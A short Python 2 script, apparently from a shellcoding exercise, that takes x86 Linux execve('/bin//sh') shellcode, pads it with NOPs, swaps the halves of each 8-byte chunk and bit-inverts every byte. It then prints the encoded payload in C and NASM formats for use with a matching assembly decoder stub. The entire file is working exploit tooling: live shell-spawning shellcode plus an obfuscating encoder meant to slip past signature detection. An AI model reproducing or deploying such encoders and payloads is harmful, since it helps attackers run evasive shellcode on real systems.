#!/usr/bin/python

import sys, random

# Shellcode for execve-stack
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Chunk size is 8 (a word) by default. 
# If changed, then the asm decoder needs to be adapted accordingly!
CHUNK_SIZE = 8

if CHUNK_SIZE >= len(shellcode) or CHUNK_SIZE % 2 != 0:
    print "Please use an even chunk size smaller than the shellcode length!"
    sys.exit()

print 'Encoded shellcode ...'

shellcode_bytearray = bytearray(shellcode)
encoded_bytearray = bytearray()

remainder = len(shellcode_bytearray) % CHUNK_SIZE
if remainder != 0:
    # Fill with padding
    shellcode_bytearray.extend([0x90] * (CHUNK_SIZE - remainder))

for i in range(len(shellcode_bytearray)):
    if i % CHUNK_SIZE == 0:
        encoded_bytearray.extend(~byte & 0xff for byte in shellcode_bytearray[i+CHUNK_SIZE/2:i+CHUNK_SIZE])
        encoded_bytearray.extend(~byte & 0xff for byte in shellcode_bytearray[i:i+CHUNK_SIZE/2])

c_format_printable = ""
nasm_format_printable = ""

for x in bytearray(encoded_bytearray) :
    c_format_printable += '\\x%02x' % x
    nasm_format_printable += '0x%02x,' %x

print c_format_printable
print nasm_format_printable[:-1]

print 'Len: %d' % len(bytearray(encoded_bytearray))
